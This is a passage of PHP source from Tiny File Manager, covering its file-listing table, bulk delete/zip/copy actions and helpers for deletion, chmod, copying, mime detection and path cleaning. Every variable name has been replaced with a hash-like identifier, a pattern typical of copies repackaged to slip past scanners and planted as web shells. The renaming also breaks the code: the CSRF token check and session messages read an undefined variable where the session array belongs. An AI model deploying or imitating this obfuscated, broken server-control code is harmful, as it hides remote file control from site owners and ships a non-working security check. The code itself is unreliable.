                            <input type="checkbox" class="custom-control-input" id="<?php echo $v54845183 ?>" name="file[]" value="<?php echo fm_enc($v1741b918) ?>">
                            <label class="custom-control-label" for="<?php echo $v54845183 ?>"></label>
                        </div>
                        </td><?php endif; ?>
                    <td data-sort=<?php echo fm_enc($v1741b918) ?>>
                        <div class="filename">
                        <?php
                           if (in_array(strtolower(pathinfo($v1741b918, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
                                <?php $v8a4d54bd = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v1741b918); ?>
                                <a href="<?php echo $vd6ca99da ?>" data-preview-image="<?php echo $v8a4d54bd ?>" title="<?php echo fm_enc($v1741b918) ?>">
                           <?php else: ?>
                                <a href="<?php echo $vd6ca99da ?>" title="<?php echo $v1741b918 ?>">
                            <?php endif; ?>
                                    <i class="<?php echo $vba6b2c9a ?>"></i> <?php echo fm_convert_win(fm_enc($v1741b918)) ?>
                                </a>
                                <?php echo($v3ad6d553 ? ' &rarr; <i>' . readlink($v5424ec5f . '/' . $v1741b918) . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="b-<?php echo str_pad($v8cd35c7d, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php printf('%s bytes', $v8cd35c7d) ?>">
                        <?php echo $v6d2ed810; ?>
                        </span></td>
                    <td data-order="b-<?php echo $v6d564650;?>"><?php echo $vd644fa8c ?></td>
                    <?php if (!FM_IS_WIN && !$v89e0b6be): ?>
                        <td><?php if (!FM_READONLY): ?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($v1741b918) ?>"><?php echo $v40c424b8 ?></a><?php else: ?><?php echo $v40c424b8 ?><?php endif; ?>
                        </td>
                        <td><?php echo fm_enc($v3bd17cd7['name'] . ':' . $v8a476006['name']) ?></td>
                    <?php endif; ?>
                    <td class="inline-actions">
                        <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Delete') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($v1741b918) ?>" onclick="confirmDailog(event, 1209, '<?php echo lng('Delete').' '.lng('File'); ?>','<?php echo urlencode($v1741b918); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php echo lng('Rename') ?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>', '<?php echo fm_enc(addslashes($v1741b918)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php echo lng('CopyTo') ?>..."
                               href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $v1741b918, '/')) ?>"><i class="fa fa-files-o"></i></a>
                        <?php endif; ?>
                        <a title="<?php echo lng('DirectLink') ?>" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $v1741b918) ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php echo lng('Download') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($v1741b918) ?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Download'); ?>','<?php echo urlencode($v1741b918); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php
                flush();
                $v54845183++;
            }

            if (empty($v3a6ba9de) && empty($v87c5f9cc)) { ?>
                <tfoot>
                    <tr><?php if (!FM_READONLY): ?>
                            <td></td><?php endif; ?>
                        <td colspan="<?php echo (!FM_IS_WIN && !$v89e0b6be) ? '6' : '4' ?>"><em><?php echo lng('Folder is empty') ?></em></td>
                    </tr>
                </tfoot>
                <?php
            } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php echo (!FM_IS_WIN && !$v89e0b6be) ? (FM_READONLY ? '6' :'7') : (FM_READONLY ? '4' : '5') ?>">
                            <?php echo lng('FullSize').': <span class="badge text-bg-light border-radius-0">'.fm_get_filesize($vf6f7850d).'</span>' ?>
                            <?php echo lng('File').': <span class="badge text-bg-light border-radius-0">'.$v4f0e7b67.'</span>' ?>
                            <?php echo lng('Folder').': <span class="badge text-bg-light border-radius-0">'.$v1311f5c4.'</span>' ?>
                        </td>
                    </tr>
                </tfoot>
                <?php } ?>
        </table>
    </div>

    <div class="row">
        <?php if (!FM_READONLY): ?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo lng('SelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo lng('UnSelectAll') ?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo lng('InvertSelection') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo lng('Delete selected files and folders?'); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo lng('Delete') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Zip') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Tar') ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy') ?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>

<?php
fm_show_footer();

// --- END HTML ---

// Functions

/**
 * It prints the css/js files into html
 * @param key The key of the external file to print.
 */
function print_external($v38591044) {
    global $v4c8d53f6;

    if(!array_key_exists($v38591044, $v4c8d53f6)) {
        // throw new Exception('Key missing in external: ' . key);
        echo "<!-- EXTERNAL: MISSING KEY $v38591044 -->";
        return;
    }

    echo "$v4c8d53f6[$v38591044]";
}

/**
 * Verify CSRF TOKEN and remove after cerify
 * @param string $token
 * @return bool
 */
function verifyToken($v8016ad18) 
{
    if (hash_equals($vbc4af197['token'], $v8016ad18)) { 
        return true;
    }
    return false;
}

/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($v5424ec5f)
{
    if (is_link($v5424ec5f)) {
        return unlink($v5424ec5f);
    } elseif (is_dir($v5424ec5f)) {
        $v4a9de2ac = scandir($v5424ec5f);
        $v5cfdbc30 = true;
        if (is_array($v4a9de2ac)) {
            foreach ($v4a9de2ac as $v81f430be) {
                if ($v81f430be != '.' && $v81f430be != '..') {
                    if (!fm_rdelete($v5424ec5f . '/' . $v81f430be)) {
                        $v5cfdbc30 = false;
                    }
                }
            }
        }
        return ($v5cfdbc30) ? rmdir($v5424ec5f) : false;
    } elseif (is_file($v5424ec5f)) {
        return unlink($v5424ec5f);
    }
    return false;
}

/**
 * Recursive chmod
 * @param string $path
 * @param int $filemode
 * @param int $dirmode
 * @return bool
 * @todo Will use in mass chmod
 */
function fm_rchmod($v5424ec5f, $ve3fb79cb, $v9993b547)
{
    if (is_dir($v5424ec5f)) {
        if (!chmod($v5424ec5f, $v9993b547)) {
            return false;
        }
        $v4a9de2ac = scandir($v5424ec5f);
        if (is_array($v4a9de2ac)) {
            foreach ($v4a9de2ac as $v81f430be) {
                if ($v81f430be != '.' && $v81f430be != '..') {
                    if (!fm_rchmod($v5424ec5f . '/' . $v81f430be, $ve3fb79cb, $v9993b547)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($v5424ec5f)) {
        return true;
    } elseif (is_file($v5424ec5f)) {
        return chmod($v5424ec5f, $ve3fb79cb);
    }
    return false;
}

/**
 * Check the file extension which is allowed or not
 * @param string $filename
 * @return bool
 */
function fm_is_valid_ext($vd4413dfd)
{
    $v0bf4bff0 = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;

    $v00b4247d = pathinfo($vd4413dfd, PATHINFO_EXTENSION);
    $ve0c1a0ea = ($v0bf4bff0) ? in_array($v00b4247d, $v0bf4bff0) : true;

    return ($ve0c1a0ea) ? true : false;
}

/**
 * Safely rename
 * @param string $old
 * @param string $new
 * @return bool|null
 */
function fm_rename($v3abf70cb, $vd97e09ef)
{
    $ve0c1a0ea = fm_is_valid_ext($vd97e09ef);

    if(!is_dir($v3abf70cb)) {
        if (!$ve0c1a0ea) return false;
    }

    return (!file_exists($vd97e09ef) && file_exists($v3abf70cb)) ? rename($v3abf70cb, $vd97e09ef) : null;
}

/**
 * Copy file or folder (recursively).
 * @param string $path
 * @param string $dest
 * @param bool $upd Update files
 * @param bool $force Create folder with same names instead file
 * @return bool
 */
function fm_rcopy($v5424ec5f, $vf25f7e4e, $v5bdd9f1c = true, $v4f39c04f = true)
{
    if (is_dir($v5424ec5f)) {
        if (!fm_mkdir($vf25f7e4e, $v4f39c04f)) {
            return false;
        }
        $v4a9de2ac = scandir($v5424ec5f);
        $v5cfdbc30 = true;
        if (is_array($v4a9de2ac)) {
            foreach ($v4a9de2ac as $v81f430be) {
                if ($v81f430be != '.' && $v81f430be != '..') {
                    if (!fm_rcopy($v5424ec5f . '/' . $v81f430be, $vf25f7e4e . '/' . $v81f430be)) {
                        $v5cfdbc30 = false;
                    }
                }
            }
        }
        return $v5cfdbc30;
    } elseif (is_file($v5424ec5f)) {
        return fm_copy($v5424ec5f, $vf25f7e4e, $v5bdd9f1c);
    }
    return false;
}

/**
 * Safely create folder
 * @param string $dir
 * @param bool $force
 * @return bool
 */
function fm_mkdir($va13c698e, $v4f39c04f)
{
    if (file_exists($va13c698e)) {
        if (is_dir($va13c698e)) {
            return $va13c698e;
        } elseif (!$v4f39c04f) {
            return false;
        }
        unlink($va13c698e);
    }
    return mkdir($va13c698e, 0777, true);
}

/**
 * Safely copy file
 * @param string $f1
 * @param string $f2
 * @param bool $upd Indicates if file should be updated with new content
 * @return bool
 */
function fm_copy($vcf7616da, $v46a3341c, $v5bdd9f1c)
{
    $v7a996dc5 = filemtime($vcf7616da);
    if (file_exists($v46a3341c)) {
        $v7e31c2cd = filemtime($v46a3341c);
        if ($v7e31c2cd >= $v7a996dc5 && $v5bdd9f1c) {
            return false;
        }
    }
    $v5cfdbc30 = copy($vcf7616da, $v46a3341c);
    if ($v5cfdbc30) {
        touch($v46a3341c, $v7a996dc5);
    }
    return $v5cfdbc30;
}

/**
 * Get mime type
 * @param string $file_path
 * @return mixed|string
 */
function fm_get_mime_type($v6314089b)
{
    if (function_exists('finfo_open')) {
        $vcd683972 = finfo_open(FILEINFO_MIME_TYPE);
        $v9cbdda2b = finfo_file($vcd683972, $v6314089b);
        finfo_close($vcd683972);
        return $v9cbdda2b;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($v6314089b);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $v81f430be = escapeshellarg($v6314089b);
        $v9cbdda2b = shell_exec('file -bi ' . $v81f430be);
        return $v9cbdda2b;
    } else {
        return '--';
    }
}

/**
 * HTTP Redirect
 * @param string $url
 * @param int $code
 */
function fm_redirect($vb444434e, $v955a89e8 = 302)
{
    header('Location: ' . $vb444434e, true, $v955a89e8);
    exit;
}

/**
 * Path traversal prevention and clean the url
 * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
 * @param $path
 * @return string
 */
function get_absolute_path($v5424ec5f) {
    $v5424ec5f = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $v5424ec5f);
    $v8ebae349 = array_filter(explode(DIRECTORY_SEPARATOR, $v5424ec5f), 'strlen');
    $vc2e9c430 = array();
    foreach ($v8ebae349 as $vbb80ebc1) {
        if ('.' == $vbb80ebc1) continue;
        if ('..' == $vbb80ebc1) {
            array_pop($vc2e9c430);
        } else {
            $vc2e9c430[] = $vbb80ebc1;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $vc2e9c430);
}

/**
 * Clean path
 * @param string $path
 * @return string
 */
function fm_clean_path($v5424ec5f, $vcad354bd = true)
{
    $v5424ec5f = $vcad354bd ? trim($v5424ec5f) : $v5424ec5f;
    $v5424ec5f = trim($v5424ec5f, '\\/');
    $v5424ec5f = str_replace(array('../', '..\\'), '', $v5424ec5f);
    $v5424ec5f =  get_absolute_path($v5424ec5f);
    if ($v5424ec5f == '..') {
        $v5424ec5f = '';
    }
    return str_replace('\\', '/', $v5424ec5f);
}

/**
 * Get parent path
 * @param string $path
 * @return bool|string
 */
function fm_get_parent_path($v5424ec5f)
{
    $v5424ec5f = fm_clean_path($v5424ec5f);
    if ($v5424ec5f != '') {
        $v1d9b7104 = explode('/', $v5424ec5f);
        if (count($v1d9b7104) > 1) {
            $v1d9b7104 = array_slice($v1d9b7104, 0, -1);
            return implode('/', $v1d9b7104);
        }
        return '';
    }
    return false;
}

function fm_get_display_path($v6314089b)
{
    global $v4178fd2f, $vfe0b8949, $v736b3163;
    switch ($v4178fd2f) {
        case 'relative':
            return array(
                'label' => 'Path',
                'path' => fm_enc(fm_convert_win(str_replace($vfe0b8949, '', $v6314089b)))
            );
        case 'host':
            $vc3ce5765 = str_replace($vfe0b8949, '', $v6314089b);
            return array(
                'label' => 'Host Path',
                'path' => fm_enc(fm_convert_win('/' . $v736b3163 . '/' . ltrim(str_replace('\\', '/', $vc3ce5765), '/')))
            );
        case 'full':
        default:
            return array(
                'label' => 'Full Path',
                'path' => fm_enc(fm_convert_win($v6314089b))
            );
    }
}

/**
 * Check file is in exclude list
 * @param string $file
 * @return bool
 */
function fm_is_exclude_items($v81f430be) {
    $v00b4247d = strtolower(pathinfo($v81f430be, PATHINFO_EXTENSION));
    if (isset($v79f58c76) and sizeof($v79f58c76)) {
        unset($v79f58c76);
    }

    $v79f58c76 = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        $v79f58c76 = unserialize($v79f58c76);
    }
    if (!in_array($v81f430be, $v79f58c76) && !in_array("*.$v00b4247d", $v79f58c76)) {
        return true;
    }
    return false;
}

/**
 * get language translations from json file
 * @param int $tr
 * @return array
 */
function fm_get_translations($v17d816fc) {
    try {
        $v920ebed6 = @file_get_contents('translation.json');
        if($v920ebed6 !== FALSE) {
            $v68f8f55d = json_decode($v920ebed6, TRUE);
            global $v248427d4;
            foreach ($v68f8f55d["language"] as $v38591044 => $v61ae10bf)
            {
                $v955a89e8 = $v61ae10bf["code"];
                $v248427d4[$v955a89e8] = $v61ae10bf["name"];
                if ($v17d816fc)
                    $v17d816fc[$v955a89e8] = $v61ae10bf["translation"];
            }
            return $v17d816fc;
        }

    }
    catch (Exception $vb8673196) {
        echo $vb8673196;
    }
}

/**
 * @param string $file
 * Recover all file sizes larger than > 2GB.
 * Works on php 32bits and 64bits and supports linux
 * @return int|string
 */
function fm_get_size($v81f430be)
{
    static $v21991951;
    static $v99a70256;
    if (!isset($v21991951)) {
        $v21991951 = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
    }
    if (!isset($v99a70256)) {
        $v99a70256 = (strtoupper(substr(PHP_OS, 0)) == "DARWIN");
    }

    static $v9dfe85ee;
    if (!isset($v9dfe85ee)) {
        $v9dfe85ee = (function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') == 'EXEC');
    }

    // try a shell command
    if ($v9dfe85ee) {
        $v46a91518 = escapeshellarg($v81f430be);
        $v85c50e1d = ($v21991951) ? "for %F in (\"$v81f430be\") do @echo %~zF" : ($v99a70256 ? "stat -f%z $v46a91518" : "stat -c%s $v46a91518");
        @exec($v85c50e1d, $v21fdd021);
        if (is_array($v21fdd021) && ctype_digit($v0e924cb5 = trim(implode("\n", $v21fdd021)))) {
            return $v0e924cb5;
        }
    }

    // try the Windows COM interface
    if ($v21991951 && class_exists("COM")) {
        try {
            $v8237527a = new COM('Scripting.FileSystemObject');
            $v1741b918 = $v8237527a->GetFile( realpath($v81f430be) );
            $v0e924cb5 = $v1741b918->Size;
        } catch (Exception $vb8673196) {
            $v0e924cb5 = null;
        }
        if (ctype_digit($v0e924cb5)) {
            return $v0e924cb5;
        }
    }

    // if all else fails
    return filesize($v81f430be);
}

/**
 * Get nice filesize
 * @param int $size
 * @return string
 */
function fm_get_filesize($v0e924cb5)
{
    $v0e924cb5 = (float) $v0e924cb5;
    $vc53a8e3b = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $v3bbc6498 = ($v0e924cb5 > 0) ? floor(log($v0e924cb5, 1024)) : 0;
    $v3bbc6498 = ($v3bbc6498 > (count($vc53a8e3b) - 1)) ? (count($vc53a8e3b) - 1) : $v3bbc6498;
    return sprintf('%s %s', round($v0e924cb5 / pow(1024, $v3bbc6498), 2), $vc53a8e3b[$v3bbc6498]);
}

/**
 * Get total size of directory tree.
 *
 * @param  string $directory Relative or absolute directory name.
 * @return int Total number of bytes.
 */
function fm_get_directorysize($vb14b4937) {
    $v8f02f9c2 = 0;
    $vb14b4937 = realpath($vb14b4937);
    if ($vb14b4937 !== false && $vb14b4937 != '' && file_exists($vb14b4937)){
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($vb14b4937, FilesystemIterator::SKIP_DOTS)) as $v81f430be){
            $v8f02f9c2 += $v81f430be->getSize();
        }
    }
    return $v8f02f9c2;
}

/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */
function fm_get_zif_info($v5424ec5f, $v00b4247d) {
    if ($v00b4247d == 'zip' && function_exists('zip_open')) {
        $v8efb6210 = @zip_open($v5424ec5f);
        if ($v8efb6210) {
            $va4575d81 = array();
            while ($vaac266e9 = @zip_read($v8efb6210)) {
                $va0de9294 = @zip_entry_name($vaac266e9);
                $v4c453f5a = substr($va0de9294, -1) == '/';
                $va4575d81[] = array(
                    'name' => $va0de9294,
                    'filesize' => @zip_entry_filesize($vaac266e9),
                    'compressed_size' => @zip_entry_compressedsize($vaac266e9),
                    'folder' => $v4c453f5a
                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
                );
            }
            @zip_close($v8efb6210);
            return $va4575d81;
        }
    } elseif($v00b4247d == 'tar' && class_exists('PharData')) {
        $v4a7d50db = new PharData($v5424ec5f);
        $va4575d81 = array();
        foreach(new RecursiveIteratorIterator($v4a7d50db) as $v81f430be) {
            $vdd6fbdda = $v81f430be->getPathInfo();
            $va0de9294 = str_replace("phar://".$v5424ec5f, '', $v81f430be->getPathName());
            $va0de9294 = substr($va0de9294, ($v8d546040 = strpos($va0de9294, '/')) !== false ? $v8d546040 + 1 : 0);
            $v4c453f5a = $vdd6fbdda->getFileName();
            $vf4afc3d0 = new SplFileInfo($v81f430be);
            $va4575d81[] = array(
                'name' => $va0de9294,
                'filesize' => $vf4afc3d0->getSize(),
                'compressed_size' => $v81f430be->getCompressedSize(),
                'folder' => $v4c453f5a
            );
        }
        return $va4575d81;
    }
    return false;
}

/**
 * Encode html entities
 * @param string $text
 * @return string
 */
function fm_enc($v8102bcbf)
{
    return htmlspecialchars($v8102bcbf, ENT_QUOTES, 'UTF-8');
}

/**
 * Prevent XSS attacks
 * @param string $text
 * @return string
 */
function fm_isvalid_filename($v8102bcbf) {
    return (strpbrk($v8102bcbf, '/?%*:|"<>') === FALSE) ? true : false;
}

/**
 * Save message in session
 * @param string $msg
 * @param string $status
 */
function fm_set_msg($v8a0e089a, $vee185ed4 = 'ok')
{
    $vbc4af197[FM_SESSION_ID]['message'] = $v8a0e089a;
    $vbc4af197[FM_SESSION_ID]['status'] = $vee185ed4;
}

/**
 * Check if string is in UTF-8
 * @param string $string
 * @return int
 */
function fm_is_utf8($vda9efadc)
{
    return preg_match('//u', $vda9efadc);
}

/**
 * Convert file name to UTF-8 in Windows
 * @param string $filename
 * @return string
 */
function fm_convert_win($vd4413dfd)
{
    if (FM_IS_WIN && function_exists('iconv')) {
        $vd4413dfd = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $vd4413dfd);
    }
    return $vd4413dfd;
}

/**
 * @param $obj
 * @return array
 */
function fm_object_to_array($v7eb162a8)
{
    if (!is_object($v7eb162a8) && !is_array($v7eb162a8)) {
        return $v7eb162a8;
    }
    if (is_object($v7eb162a8)) {
        $v7eb162a8 = get_object_vars($v7eb162a8);
    }
    return array_map('fm_object_to_array', $v7eb162a8);
}

/**
 * Get CSS classname for file
 * @param string $path
 * @return string
 */
function fm_get_file_icon_class($v5424ec5f)
{
    // get extension
    $v00b4247d = strtolower(pathinfo($v5424ec5f, PATHINFO_EXTENSION));

    switch ($v00b4247d) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'webp':
        case 'avif':
        case 'svg':
            $vba6b2c9a = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'ts':
        case 'jsx':
        case 'tsx':
        case 'hbs':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'rs':
        case 'map':
        case 'lock':
        case 'dtd':
            $vba6b2c9a = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
        case 'yaml':
        case 'yml':
        case 'toml':
        case 'tmp':
        case 'top':
        case 'bot':
        case 'dat':
        case 'bak':
        case 'htpasswd':
        case 'pl':
            $vba6b2c9a = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $vba6b2c9a = 'fa fa-css3';
            break;
        case 'bz2':
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tar':
        case '7z':
        case 'xz':
            $vba6b2c9a = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $vba6b2c9a = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $vba6b2c9a = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $vba6b2c9a = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $vba6b2c9a = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
        case 'xspf':
            $vba6b2c9a = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
        case 'webm':
            $vba6b2c9a = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $vba6b2c9a = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
        case 'ods':
            $vba6b2c9a = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $vba6b2c9a = 'fa fa-file-text-o';
            break;
        case 'bak':
        case 'swp':
            $vba6b2c9a = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
        case 'odt':
            $vba6b2c9a = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $vba6b2c9a = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $vba6b2c9a = 'fa fa-font';
            break;
        case 'pdf':
            $vba6b2c9a = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $vba6b2c9a = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $vba6b2c9a = 'fa fa-file-o';
            break;
        case 'bat':
            $vba6b2c9a = 'fa fa-terminal';
            break;
        default:
            $vba6b2c9a = 'fa fa-info-circle';
    }

    return $vba6b2c9a;
}

/**
 * Get image files extensions
 * @return array
 */
function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
}

/**
 * Get video files extensions
 * @return array
 */
function fm_get_video_exts()
{
    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}

/**
 * Get audio files extensions
 * @return array
 */
function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}

/**
 * Get text file extensions
 * @return array
 */
function fm_get_text_exts()
{
    return array(
        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'ts', 'jsx', 'tsx', 'mjs', 'json', 'sh', 'config',
        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue', 'bash', 'vue',
        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'go', 'zsh', 'swift',
        'map', 'lock', 'dtd', 'svg', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsp', 'jspx', 'cgi', 'dockerfile', 'ruby', 'yml', 'yaml', 'toml',
        'vhost', 'scpt', 'applescript', 'csx', 'cshtml', 'c++', 'coffee', 'cfm', 'rb', 'graphql', 'mustache', 'jinja', 'http', 'handlebars',
        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl'
    );
}

/**
 * Get mime types of text files
 * @return array
 */
function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
        'application/json',
    );
}

/**
 * Get file names of text files w/o extensions
 * @return array
 */
function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}

/**
 * Get online docs viewer supported files extensions
 * @return array
 */
function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
}

/**
 * It returns the mime type of a file based on its extension.
 * @param extension The file extension of the file you want to get the mime type for.
 * @return string|string[] The mime type of the file.
 */
function fm_get_file_mimes($v49fe1a22)
{
    $v74ce6e31['swf'] = 'application/x-shockwave-flash';
    $v74ce6e31['pdf'] = 'application/pdf';
    $v74ce6e31['exe'] = 'application/octet-stream';
    $v74ce6e31['zip'] = 'application/zip';
    $v74ce6e31['doc'] = 'application/msword';
    $v74ce6e31['xls'] = 'application/vnd.ms-excel';
    $v74ce6e31['ppt'] = 'application/vnd.ms-powerpoint';
    $v74ce6e31['gif'] = 'image/gif';
    $v74ce6e31['png'] = 'image/png';
    $v74ce6e31['jpeg'] = 'image/jpg';
    $v74ce6e31['jpg'] = 'image/jpg';
    $v74ce6e31['webp'] = 'image/webp';
    $v74ce6e31['avif'] = 'image/avif';
    $v74ce6e31['rar'] = 'application/rar';

    $v74ce6e31['ra'] = 'audio/x-pn-realaudio';
    $v74ce6e31['ram'] = 'audio/x-pn-realaudio';
    $v74ce6e31['ogg'] = 'audio/x-pn-realaudio';

    $v74ce6e31['wav'] = 'video/x-msvideo';
    $v74ce6e31['wmv'] = 'video/x-msvideo';
    $v74ce6e31['avi'] = 'video/x-msvideo';
    $v74ce6e31['asf'] = 'video/x-msvideo';
    $v74ce6e31['divx'] = 'video/x-msvideo';

    $v74ce6e31['mp3'] = 'audio/mpeg';
    $v74ce6e31['mp4'] = 'audio/mpeg';
    $v74ce6e31['mpeg'] = 'video/mpeg';
    $v74ce6e31['mpg'] = 'video/mpeg';
    $v74ce6e31['mpe'] = 'video/mpeg';
    $v74ce6e31['mov'] = 'video/quicktime';
    $v74ce6e31['swf'] = 'video/quicktime';
    $v74ce6e31['3gp'] = 'video/quicktime';
    $v74ce6e31['m4a'] = 'video/quicktime';
    $v74ce6e31['aac'] = 'video/quicktime';
    $v74ce6e31['m3u'] = 'video/quicktime';

    $v74ce6e31['php'] = ['application/x-php'];
    $v74ce6e31['html'] = ['text/html'];
    $v74ce6e31['txt'] = ['text/plain'];
    //Unknown mime-types should be 'application/octet-stream'
